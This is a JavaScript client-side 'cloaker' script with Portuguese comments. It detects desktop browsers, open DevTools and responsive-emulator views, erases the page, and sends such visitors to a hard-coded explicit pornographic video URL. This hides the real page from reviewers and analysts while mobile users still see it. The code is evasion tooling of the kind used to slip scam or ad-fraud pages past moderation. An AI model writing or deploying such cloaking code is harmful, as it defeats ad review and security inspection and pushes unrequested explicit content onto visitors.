/**
 * CLOAKER CLIENT-SIDE - VERSÃO 2.1
 * Proteção contra desktop, DevTools e visualização responsiva
 * Autor: Sistema de Proteção Avançada
 * Data: 2025
 */

(function() {
    'use strict';
    
    // Configuração do redirecionamento
    const REDIRECT_URL = 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao';
    
    // Variáveis de controle
    let protectionActive = true;
    let lastDebugTime = Date.now();
    
    /**
     * Função principal de proteção
     */
    function initProtection() {
        if (!protectionActive) return;
        
        // Executar verificações imediatas
        checkDesktop();
        checkDevTools();
        checkResponsiveView();
        
        // Verificação contínua
        setInterval(() => {
            if (!protectionActive) return;
            checkDevTools();
            checkResponsiveView();
        }, 1000);
    }
    
    /**
     * 🔒 1. Bloquear computadores e notebooks (desktop)
     */
    function checkDesktop() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Padrões específicos de desktop
        const desktopPatterns = ['windows nt', 'macintosh', 'linux x86_64', 'x11'];
        
        // Padrões móveis para verificar se NÃO é mobile
        const mobilePatterns = [
            'android', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 
            'opera mini', 'mobile', 'tablet', 'phone', 'samsung', 'xiaomi',
            'motorola', 'lg', 'nokia', 'huawei', 'oneplus', 'google pixel'
        ];
        
        // Verificar se é desktop (tem padrão desktop E não tem padrão mobile)
        const isDesktop = desktopPatterns.some(pattern => userAgent.includes(pattern)) &&
                         !mobilePatterns.some(pattern => userAgent.includes(pattern));
        
        if (isDesktop) {
            console.log('[PROTECTION] Desktop detectado - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * 🛡️ 2. Detectar abertura do DevTools (inspecionar elemento)
     */
    function checkDevTools() {
        const currentTime = Date.now();
        const timeDiff = currentTime - lastDebugTime;
        
        // Se o tempo entre execuções for maior que 100ms, DevTools foi aberto
        if (timeDiff > 100) {
            console.log('[PROTECTION] DevTools detectado - redirecionando...');
            redirectToTarget();
        }
        
        lastDebugTime = currentTime;
        
        // Debugger oculto
        try {
            debugger;
        } catch (e) {
            // Ignorar erros do debugger
        }
    }
    
    /**
     * 📏 3. Detectar visualização responsiva (modo emulador)
     */
    function checkResponsiveView() {
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        const threshold = 160;
        
        // Só redirecionar se for uma diferença muito grande (indicando DevTools)
        if (widthDiff > threshold || heightDiff > threshold) {
            console.log('[PROTECTION] Visualização responsiva detectada - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * Função de redirecionamento
     */
    function redirectToTarget() {
        protectionActive = false;
        
        // Limpar conteúdo da página
        document.documentElement.innerHTML = '';
        
        // Redirecionar
        try {
            window.location.href = REDIRECT_URL;
        } catch (e) {
            // Fallback
            window.location.replace(REDIRECT_URL);
        }
    }
    
    // Inicializar proteção quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initProtection);
    } else {
        initProtection();
    }
    
    // Proteção adicional no load
    window.addEventListener('load', () => {
        // Verificar novamente após carregamento completo
        setTimeout(() => {
            checkDesktop();
        }, 1000);
    });
    
})();
